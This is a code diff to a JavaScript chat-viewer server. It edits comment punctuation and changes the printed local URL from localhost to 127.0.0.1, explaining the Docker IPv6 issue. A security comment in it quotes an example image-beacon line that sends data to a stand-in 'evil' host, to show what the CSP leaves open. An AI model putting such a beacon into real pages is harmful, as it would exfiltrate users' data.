@@ -155,7 +155,7 @@ class ChatsMobile {
   setupMiddleware() {
     // Security headers (defense-in-depth). The viewer renders untrusted
     // transcript content, and startServer() binds every interface (no host arg
-    // on app.listen) with an opt-in Cloudflare tunnel on top — so treat these
+    // on app.listen) with an opt-in Cloudflare tunnel on top, so treat these
     // as a real control, not decoration.
     //
     // Be honest about what this CSP does and doesn't buy:
@@ -163,7 +163,7 @@ class ChatsMobile {
     //     built on inline handlers and an inline <script>. That means CSP does
     //     NOT backstop an injected inline handler. The actual XSS defense is
     //     output-escaping at the render sites (chats_mobile.html,
-    //     BlockRenderers.js) — this header is a second layer, not the fix.
+    //     BlockRenderers.js). This header is a second layer, not the fix.
     //   - connect-src 'self' blocks fetch/XHR/WebSocket exfiltration, but
     //     img-src still allows https:, so a pixel beacon
     //     (new Image().src = 'https://evil/?d=…') is NOT blocked. https: is kept
@@ -1508,7 +1508,12 @@ class ChatsMobile {
         if (address && typeof address === 'object') {
           this.port = address.port;
         }
-        this.localUrl = `http://localhost:${this.port}`;
+        // 127.0.0.1, not "localhost". Under Docker the published port is bound
+        // IPv4-only (docker-compose maps 127.0.0.1:9876), but "localhost"
+        // resolves to both 127.0.0.1 and ::1, so a client that prefers IPv6
+        // gets ECONNREFUSED on the very URL we print and auto-open, making a
+        // perfectly healthy server look broken on first run.
+        this.localUrl = `http://127.0.0.1:${this.port}`;
         console.log(chalk.green(`📱 Chats Mobile server started at ${this.localUrl}`));
         
         // Initialize WebSocket server with HTTP server
@@ -1636,7 +1641,7 @@ class ChatsMobile {
   async openBrowser() {
     try {
       // Use tunnel URL if available, otherwise local URL
-      const url = this.tunnelUrl || this.localUrl || `http://localhost:${this.port}`;
+      const url = this.tunnelUrl || this.localUrl || `http://127.0.0.1:${this.port}`;
       console.log(chalk.cyan(`🌐 Opening browser to ${url}`));
       await open(url);
     } catch (error) {
